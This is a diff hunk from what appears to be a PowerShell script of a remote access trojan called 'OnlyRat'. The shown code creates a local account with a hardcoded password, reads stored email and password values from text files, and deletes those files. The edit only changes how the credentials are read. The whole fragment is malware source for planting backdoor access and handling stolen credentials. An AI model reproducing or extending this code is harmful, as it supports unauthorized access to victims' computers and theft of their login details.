@@ -39,8 +39,8 @@ $pword = (ConvertTo-SecureString "OnlyRat123" -AsPlainText -Force)
 create_account -uname $uname -pword $pword
 
 # get credentials
-$email = Get-Content email.txt
-$pass = Get-Content pass.txt
+$email = Get-Content email.txt | Out-String
+$pass = Get-Content pass.txt | Out-String
 del email.txt
 del pass.txt
 
